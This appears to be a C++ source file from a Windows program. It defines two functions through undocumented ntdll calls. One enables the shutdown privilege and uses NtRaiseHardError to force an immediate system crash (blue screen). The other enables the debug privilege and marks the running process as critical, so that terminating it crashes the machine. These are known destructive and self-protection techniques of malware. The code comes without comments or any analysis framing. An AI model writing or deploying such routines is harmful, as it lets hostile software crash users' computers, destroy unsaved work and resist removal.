#include "Undulations.h"

bool FunctionalPrivilege::HardError()
{
	BOOLEAN bEnabled = 0;
	ULONG uResponse  = 0;
	if(ntdll)
	{
		if(RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL)
		{
			return false;
		}
		RtlAdjustPrivilege(0x13,true,false,&bEnabled);
		NtRaiseHardError(0xc0000007,0,0,0,0x06,&uResponse);
	}
	else
	{
		return false;
	}
	return true;
}


bool FunctionalPrivilege::HardErrorInitialization()
{
	if(ntdll)
	{
		NtRaiseHardError = (RaiseHardError)GetProcAddress(ntdll,"NtRaiseHardError");
		if(NtRaiseHardError == NULL)
		{
			return false;
		}
	}
	else
	{
		return false;
	}
	return true;
}




bool FunctionalPrivilege::SetCriticalProcess(bool infoEnabled)
{
	BOOLEAN bEnabled = 0;
	ULONG uInfo = infoEnabled;
	ntdll = LoadLibrary(TEXT("ntdll.dll"));
	if(ntdll)
	{
		RtlAdjustPrivilege = (AdjustPrivilege)GetProcAddress(ntdll,"RtlAdjustPrivilege");
		NtSetInformationProcess = (SetInformationProcess)GetProcAddress(ntdll,"NtSetInformationProcess");
		if(RtlAdjustPrivilege == NULL || NtSetInformationProcess == NULL)
		{
			FreeLibrary(ntdll);
			return false;
		}
		RtlAdjustPrivilege(0x14,true,false,&bEnabled);
		NtSetInformationProcess(GetCurrentProcess(),0x1D,&uInfo,sizeof(uInfo));
	}
	else
	{
		return false;
	}
	FreeLibrary(ntdll);
	return true;
}